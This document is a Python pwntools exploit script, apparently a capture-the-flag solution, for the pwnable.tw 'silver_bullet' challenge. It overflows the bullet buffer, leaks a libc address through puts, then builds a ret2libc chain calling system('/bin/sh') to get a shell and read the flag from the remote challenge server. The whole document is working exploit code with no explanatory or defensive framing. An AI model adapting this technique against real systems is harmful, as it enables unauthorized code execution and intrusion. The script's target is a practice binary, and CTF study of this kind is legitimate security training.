#!/usr/bin/env python3

from pwn import *

exe = ELF("./silver_bullet_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x08048840
            b* 0x080488E2
            b* 0x80488fb
            b* 0x080487AF
            b* 0x08048A18
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10103)

def create_bullet(name):
    p.sendafter(b'choice :', str(1))
    p.sendafter(b'bullet :', name)

def power_up(name):
    p.sendafter(b'choice :', str(2))
    p.sendafter(b'bullet :', name)

create_bullet(b'a'*0x2f)
power_up(b'b')
payload = flat(
    b'a'*2 + b'\xff',
    b'a'*4,
    exe.plt.puts,
    exe.sym.main,
    exe.got.puts,
    )
# GDB()
power_up(payload)
p.sendafter(b'choice :', str(3))

# Leak libc
p.recvuntil(b'Oh ! You win !!\n')
libc_leak = u32(p.recv(4))
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym.puts
print("Libc base: " + hex(libc.address))

# Get shell
create_bullet(b'a'*0x2f)
power_up(b'b')
payload = flat(
    b'a'*2 + b'\xff',
    b'a'*4,
    libc.sym.system,
    b'a'*4,
    next(libc.search(b'/bin/sh')),
    )
power_up(payload)
p.sendafter(b'choice :', str(3))
p.sendline(b'cat /home/silver_bullet/flag')

p.interactive()